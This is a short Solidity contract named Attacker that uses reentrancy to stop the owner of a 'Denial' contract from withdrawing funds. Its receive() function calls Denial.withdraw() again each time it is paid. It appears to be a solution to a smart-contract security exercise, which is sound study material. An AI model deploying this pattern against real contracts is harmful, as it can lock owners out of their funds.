pragma solidity ^0.8.0; 
//SPDX-License-Identifier: UNLICENSED

import "./Denial.sol";

/**
 * Performs a reentrancy attack to deny the owner of the Denial contract from retrieving funds. 
 * Reentrancy attack is initiated in the receive() function. 
 */
contract Attacker {
    
    /**
     * If called by Denial contract, will call Denial.withdraw().
     */
    receive() external payable {
        Denial d = Denial(payable(msg.sender));
        d.withdraw();
    }
}